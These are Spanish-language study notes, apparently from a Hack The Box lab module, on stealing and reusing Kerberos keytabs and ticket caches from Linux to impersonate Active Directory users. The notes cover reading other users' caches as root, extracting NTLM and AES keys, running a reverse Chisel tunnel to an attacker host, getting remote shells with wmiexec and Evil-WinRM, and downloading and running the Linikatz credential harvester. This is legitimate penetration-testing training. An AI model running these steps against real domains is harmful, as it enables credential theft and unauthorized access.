
## 1. Conceptos clave

En entornos Linux integrados con Active Directory, Kerberos permite autenticarse en el dominio y acceder a recursos de Windows sin introducir la contraseña cada vez.

Los tickets pueden almacenarse en diferentes formatos:

|Formato|Descripción|Ubicación habitual|
|---|---|---|
|`ccache`|Caché que almacena credenciales y tickets Kerberos de una sesión.|`/tmp/krb5cc_*`|
|`keytab`|Archivo con principales Kerberos y claves cifradas que permite autenticarse sin introducir la contraseña.|`/etc/krb5.keytab` o rutas personalizadas|

**Objetivo:** localizar tickets o archivos keytab, reutilizarlos para suplantar identidades y acceder a recursos del dominio con los permisos de la cuenta correspondiente.

> Un sistema Linux no necesita estar unido a Active Directory para utilizar tickets Kerberos.

## 2. Identificar si Linux está integrado en Active Directory

### Comprobar el dominio con `realm`

```
realm list
```

Permite identificar:

- Nombre del dominio y realm Kerberos.
    
- Si el sistema está configurado como miembro del dominio.
    
- Servicios utilizados para la integración, como SSSD.
    
- Usuarios y grupos autorizados para iniciar sesión.
    

### Comprobar procesos de integración

Si `realm` no está disponible:

```
ps -ef | grep -i "winbind\|sssd"
```

La presencia de procesos como `sssd` o `winbind` puede indicar que Linux está integrado con Active Directory.

## 3. Buscar archivos keytab

Los archivos keytab permiten autenticarse con Kerberos sin conocer ni introducir directamente la contraseña del usuario.

### Buscar archivos en el sistema

```
find / -name '*keytab*' -ls 2>/dev/null
```

Presta atención a:

- `/etc/krb5.keytab`: normalmente contiene las credenciales de la cuenta de equipo.
    
- Archivos `.keytab` en directorios de scripts o aplicaciones.
    
- Archivos con nombres diferentes que puedan contener credenciales Kerberos.
    

Los permisos de lectura del archivo son necesarios para utilizarlo.

### Revisar tareas cron y scripts

```
crontab -l
```

Busca scripts automatizados que utilicen Kerberos. Después, inspecciona su contenido:

```
cat /ruta/al/script.sh
```

Un ejemplo de script que utiliza un keytab:

```
kinit svc_workstations@INLANEFREIGHT.HTB -k -t /ruta/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls' -k -no-pass
```

**Indicadores importantes:**

- `kinit`: solicita credenciales Kerberos y obtiene un TGT.
    
- `-k`: utiliza claves de un keytab.
    
- `-t`: especifica la ruta del keytab.
    
- `smbclient -k`: utiliza Kerberos para autenticarse.
    
- `-no-pass`: evita solicitar una contraseña.
    

Si encuentras un keytab utilizado por un script, identifica el principal Kerberos asociado y comprueba qué recursos puede alcanzar.

## 4. Buscar archivos ccache

Los archivos ccache almacenan tickets Kerberos obtenidos durante una sesión.

### Comprobar la variable de entorno

```
env | grep -i krb5
```

Ejemplo:

```
KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
```

`KRB5CCNAME` indica qué caché de credenciales utiliza la sesión actual.

### Buscar cachés en `/tmp`

```
ls -la /tmp
```

Puedes encontrar archivos como:

```
/tmp/krb5cc_647401106_XXXXXX
/tmp/krb5cc_647401107_XXXXXX
/tmp/krb5cc_647402606
```

El propietario del archivo puede ayudar a identificar al usuario asociado.

**Importante:** normalmente, cada usuario solo puede leer sus propios archivos ccache. Los privilegios de root pueden permitir acceder a las cachés de otros usuarios.

## 5. Abusar de archivos keytab

### 5.1. Identificar el principal del keytab

Utiliza `klist` para consultar los principales y las fechas del archivo:

```
klist -k -t /ruta/archivo.keytab
```

Ejemplo:

```
klist -k -t /opt/specialfiles/carlos.keytab
```

Salida relevante:

```
KVNO Timestamp           Principal
---- ------------------- -------------------------
   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB
```

Esto permite identificar la cuenta para la que se creó el keytab.

### 5.2. Comprobar el ticket actual

```
klist
```

Muestra:

- Caché Kerberos utilizada.
    
- Principal predeterminado.
    
- Fecha de inicio del ticket.
    
- Fecha de expiración.
    
- Periodo de renovación.
    

### 5.3. Autenticarse con el keytab

```
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
```

Comprueba el resultado:

```
klist
```

El principal predeterminado debería aparecer como:

```
Default principal: carlos@INLANEFREIGHT.HTB
```

A partir de ese momento, la sesión utiliza las credenciales Kerberos de Carlos.

**Atención:** `kinit` distingue entre mayúsculas y minúsculas. Utiliza el principal tal como aparece en `klist -k -t`.

### 5.4. Validar el acceso a SMB

```
smbclient //dc01/carlos -k -c ls
```

- `-k`: utiliza Kerberos.
    
- `-c ls`: ejecuta el comando `ls` en el recurso compartido.
    

El acceso dependerá de los permisos de la cuenta suplantada.

**Importante:** importar un keytab puede permitir obtener un TGT, pero no concede privilegios adicionales por sí mismo.

Antes de cambiar de identidad, guarda una copia de la caché original si necesitas conservar la sesión Kerberos anterior.

## 6. Extraer hashes de un keytab

Un keytab puede contener claves criptográficas que permiten realizar otros ataques contra la cuenta asociada.

En el laboratorio se utiliza **KeyTabExtract** para extraer información de un archivo keytab.

### Ejecutar KeyTabExtract

```
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```

La herramienta puede mostrar:

- Realm.
    
- Principal de servicio.
    
- Hash NTLM, cuando existe una clave RC4-HMAC compatible.
    
- Claves AES-128 y AES-256.
    

Ejemplo de salida:

```
REALM : INLANEFREIGHT.HTB
SERVICE PRINCIPAL : carlos/
NTLM HASH : <hash_ntlm>
AES-256 HASH : <clave_aes256>
AES-128 HASH : <clave_aes128>
```

### Posibles usos

|Material obtenido|Posible uso|
|---|---|
|Hash NTLM|Ataques Pass the Hash compatibles o cracking.|
|Clave AES-128|Autenticación Kerberos o ataques compatibles con esta clave.|
|Clave AES-256|Autenticación Kerberos o ataques compatibles con esta clave.|
|Contraseña recuperada|Inicio de sesión como la cuenta, si las credenciales siguen siendo válidas.|

Las claves AES no son contraseñas en texto plano. La posibilidad de utilizarlas depende de la herramienta y del tipo de ataque.

### Cracking de hashes

El módulo muestra el uso de servicios de cracking en línea para comprobar si un hash NTLM corresponde a una contraseña conocida.

También pueden utilizarse herramientas locales como Hashcat o John the Ripper, seleccionando el modo de hash apropiado.

Si recuperas la contraseña, puedes intentar iniciar sesión como el usuario:

```
su - carlos@inlanefreight.htb
```

Después, comprueba los tickets disponibles:

```
klist
```

**Nota:** un keytab puede contener varias claves y credenciales, incluso correspondientes a diferentes usuarios.

## 7. Abusar de archivos ccache de otros usuarios

Si obtienes privilegios de root, puedes buscar cachés Kerberos pertenecientes a otros usuarios.

### 7.1. Buscar las cachés

```
ls -la /tmp
```

Identifica:

- Propietario.
    
- Nombre del archivo.
    
- Fecha de modificación.
    
- Posible relación con usuarios privilegiados.
    

### 7.2. Comprobar los grupos de un usuario

```
id julio@inlanefreight.htb
```

En el laboratorio, Julio pertenece al grupo `Domain Admins`, por lo que su identidad resulta especialmente interesante.

La pertenencia a un grupo privilegiado no demuestra por sí sola que una caché concreta sea válida; hay que comprobar el ticket y su expiración.

### 7.3. Copiar una caché y utilizarla

Si tienes permiso para leer la caché, copia el archivo a una ubicación controlada:

```
cp /ruta/al/ccache /root/julio.ccache
```

Establece la variable de entorno:

```
export KRB5CCNAME=/root/julio.ccache
```

Comprueba qué identidad contiene:

```
klist
```

La salida debe mostrar el principal esperado:

```
Default principal: julio@INLANEFREIGHT.HTB
```

### 7.4. Validar el acceso al controlador de dominio

```
smbclient //dc01/C$ -k -c ls -no-pass
```

Opciones:

- `-k`: autenticación Kerberos.
    
- `-c ls`: lista el contenido del recurso compartido.
    
- `-no-pass`: evita solicitar una contraseña.
    

Si la operación funciona, significa que el ticket ha permitido acceder al recurso con los permisos de la identidad asociada.

### Consideraciones sobre ccache

Los tickets son temporales y pueden expirar o dejar de funcionar.

Comprueba siempre:

```
klist
```

Presta especial atención a:

- `Default principal`.
    
- `Valid starting`.
    
- `Expires`.
    
- `renew until`.
    

No confundas el nombre del archivo con la identidad que contiene: verifica siempre el principal con `klist`.

## 8. Usar herramientas de ataque desde Linux con Kerberos

Las herramientas compatibles con Kerberos pueden utilizar la caché seleccionada mediante `KRB5CCNAME`.

Para utilizarlas desde una máquina externa al dominio, debes resolver dos problemas:

1. Tener conectividad con el KDC y los servicios del objetivo.
    
2. Resolver correctamente los nombres de dominio y de los equipos.
    

En el laboratorio se utiliza **Chisel + Proxychains** para acceder a la red interna a través de MS01.

### 8.1. Configurar `/etc/hosts`

Ejemplo del laboratorio:

```
172.16.1.10 inlanefreight.htb inlanefreight dc01.inlanefreight.htb dc01
172.16.1.5  ms01.inlanefreight.htb ms01
```

Sustituye las direcciones por las correspondientes a tu laboratorio.

### 8.2. Configurar Proxychains

En `/etc/proxychains.conf`, configura el proxy SOCKS5:

```
[ProxyList]
socks5 127.0.0.1 1080
```

### 8.3. Iniciar Chisel en el host de ataque

```
./chisel server --reverse
```

El servidor queda a la espera de una conexión del equipo intermediario.

### 8.4. Conectar Chisel desde MS01

En MS01, ejecuta:

```
C:\Tools\chisel.exe client IP_HOST_ATAQUE:8080 R:socks
```

Sustituye `IP_HOST_ATAQUE` por la IP de tu máquina de ataque.

Esto crea el túnel SOCKS inverso utilizado por Proxychains.

### 8.5. Transferir el ccache

Copia el archivo ccache deseado desde Linux al host de ataque.

Establece la variable de entorno con la ruta del archivo transferido:

```
export KRB5CCNAME=/home/htb-student/julio.ccache
```

Comprueba el ticket:

```
klist
```

La caché debe corresponder al usuario que quieres utilizar y contener un ticket válido.

## 9. Impacket con Kerberos

Para utilizar un ticket Kerberos con herramientas de Impacket:

- Utiliza `-k` para habilitar la autenticación Kerberos.
    
- Utiliza `-no-pass` cuando necesites evitar la autenticación mediante contraseña.
    
- Especifica el nombre del equipo objetivo, no solo su dirección IP.
    
- Asegúrate de que el nombre se resuelva correctamente y de que exista conectividad con los servicios necesarios.
    

### Ejemplo: wmiexec

```
proxychains impacket-wmiexec dc01 -k
```

Si necesitas indicar explícitamente que no se utilice una contraseña:

```
proxychains impacket-wmiexec dc01 -k -no-pass
```

Una conexión satisfactoria permite obtener una shell remota con la identidad asociada al ticket, siempre que el usuario tenga permisos suficientes.

### Particularidad de `KRB5CCNAME`

Algunas herramientas esperan una ruta de archivo simple, mientras que otras configuraciones utilizan el prefijo `FILE:`.

Si Impacket no encuentra la caché, comprueba el formato de la variable:

```
echo "$KRB5CCNAME"
```

Si la implementación requiere solo la ruta, elimina el prefijo `FILE:` para esa ejecución.

## 10. Evil-WinRM con Kerberos

Para utilizar Evil-WinRM con autenticación Kerberos, el módulo indica instalar el paquete `krb5-user` en sistemas basados en Debian.

### Instalar Kerberos

```
sudo apt-get install krb5-user -y
```

Configura el realm y el KDC en `/etc/krb5.conf`.

Ejemplo:

```
[libdefaults]
    default_realm = INLANEFREIGHT.HTB

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }
```

Adapta el realm y el nombre del KDC al entorno real.

### Conectarse con Evil-WinRM

```
proxychains evil-winrm -i dc01 -r INLANEFREIGHT.HTB
```

Si la autenticación y la conexión funcionan, podrás obtener una sesión remota con la identidad Kerberos utilizada.

**Requisitos importantes:**

- Ticket válido en la caché.
    
- Realm y KDC configurados correctamente.
    
- Resolución de nombres funcional.
    
- Conectividad con el servicio WinRM.
    
- Permisos suficientes para acceder mediante WinRM.

## 11. Convertir tickets entre Linux y Windows

Los formatos más relevantes en este módulo son:

- `.ccache`: utilizado habitualmente en Linux.
    
- `.kirbi`: utilizado habitualmente en herramientas Kerberos para Windows.
    

Impacket proporciona `impacket-ticketConverter` para convertir entre ambos formatos.

### Convertir ccache a kirbi

```
impacket-ticketConverter julio.ccache julio.kirbi
```

### Importar el ticket en Windows con Rubeus

```
C:\Tools\Rubeus.exe ptt /ticket:C:\Tools\julio.kirbi
```

Comprueba el ticket importado:

```
klist
```

Después, valida el acceso a un recurso autorizado:

```
dir \\dc01\julio
```

**Importante:** convertir e importar un ticket no aumenta los privilegios de la cuenta. Solo permite reutilizar las credenciales Kerberos representadas por ese ticket.

## 12. Linikatz

**Linikatz** es una herramienta inspirada en Mimikatz que permite recopilar credenciales y material Kerberos de sistemas Linux integrados con diferentes implementaciones de autenticación.

Puede examinar elementos relacionados con:

- SSSD.
    
- Kerberos.
    
- Samba.
    
- FreeIPA.
    
- Otras implementaciones compatibles.
    

### Ejecución

El módulo muestra la descarga del script y su ejecución con privilegios elevados:

```
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
```

```
sudo /opt/linikatz.sh
```

Utiliza la ruta en la que hayas guardado el script.

Linikatz puede encontrar:

- Archivos ccache.
    
- Archivos keytab.
    
- Tickets de usuarios.
    
- Tickets de cuentas de equipo.
    
- Material almacenado por servicios de integración como SSSD.
    

Los resultados se guardan en una carpeta cuyo nombre comienza por `linikatz`.

**Punto importante:** para aprovechar la recopilación amplia de credenciales descrita en el módulo, necesitas privilegios de root.

## 14. Flujo de trabajo para un laboratorio CPTS/OSCP

### Paso 1: Identificar la integración con Active Directory

```
realm list
ps -ef | grep -i "winbind\|sssd"
```

### Paso 2: Buscar material Kerberos

```
find / -name '*keytab*' -ls 2>/dev/null
env | grep -i krb5
ls -la /tmp
```

### Paso 3: Investigar los keytabs

```
klist -k -t /ruta/archivo.keytab
```

Identifica el principal y determina si puedes leer el archivo.

### Paso 4: Comprobar si puedes obtener un TGT

```
kinit usuario@REALM -k -t /ruta/archivo.keytab
klist
```

### Paso 5: Validar los permisos de la identidad

```
smbclient //dc01/recurso -k -c ls
```

Comprueba los permisos reales de acceso. No asumas que una cuenta es privilegiada solo porque el ticket se haya importado correctamente.

### Paso 6: Revisar tareas automatizadas

```
crontab -l
```

Inspecciona los scripts para encontrar referencias a keytabs, `kinit` y recursos de red.

### Paso 7: Si tienes root, revisar las cachés de otros usuarios

```
ls -la /tmp
```

Comprueba la identidad y la expiración de cada ticket antes de utilizarlo.

### Paso 8: Si atacas desde una máquina externa

1. Configura la resolución de nombres.
    
2. Establece el túnel con Chisel.
    
3. Configura Proxychains.
    
4. Transfiere el ccache.
    
5. Configura `KRB5CCNAME`.
    
6. Utiliza herramientas compatibles con Kerberos, como Impacket o Evil-WinRM.

## 15. Errores y consideraciones importantes

- **Ticket expirado:** comprueba `Expires` mediante `klist`.
    
- **Principal incorrecto:** respeta las mayúsculas y minúsculas utilizadas en el realm y el principal.
    
- **Permisos insuficientes:** disponer de un ticket no garantiza acceso a cualquier recurso.
    
- **Problemas de DNS:** Kerberos depende de que los nombres de dominio y de los equipos se resuelvan correctamente.
    
- **Problemas de conectividad:** el host debe poder alcanzar los servicios necesarios del KDC y del objetivo.
    
- **Variable** `**KRB5CCNAME**` **incorrecta:** verifica que apunte a la caché que quieres utilizar y comprueba si la herramienta requiere el prefijo `FILE:`.
    
- **Cambio de identidad:** `kinit` puede sustituir el principal predeterminado de la caché actual. Guarda la caché anterior si necesitas recuperarla.
    
- **Keytab y ccache no son equivalentes:** el keytab contiene claves que permiten autenticarse; el ccache almacena credenciales y tickets de una sesión.
    
- **Cachés temporales:** los archivos ccache pueden desaparecer, cambiar o dejar de ser válidos durante los ciclos de inicio y cierre de sesión.

## Resumen final

La técnica **Pass the Ticket (PtT) desde Linux** consiste en localizar y reutilizar material de autenticación Kerberos para actuar como otra identidad dentro de Active Directory.

Los puntos fundamentales son:

1. Identificar si Linux está integrado con AD mediante `realm`, SSSD o Winbind.
    
2. Buscar archivos keytab, cachés ccache y scripts automatizados.
    
3. Utilizar `klist` para identificar principales y comprobar la validez de los tickets.
    
4. Utilizar `kinit -k -t` para autenticarse mediante un keytab.
    
5. Examinar los keytabs con herramientas como KeyTabExtract para identificar claves aprovechables.
    
6. Si se dispone de privilegios suficientes, buscar cachés pertenecientes a otros usuarios.
    
7. Configurar Chisel, Proxychains y la resolución de nombres cuando sea necesario pivotar desde una máquina externa.
    
8. Utilizar tickets con herramientas como Impacket, Evil-WinRM o SMB.
    
9. Convertir entre `.ccache` y `.kirbi` cuando sea necesario trabajar entre Linux y Windows.
    
10. Comprobar siempre la expiración, la identidad y los permisos efectivos de cada ticket.
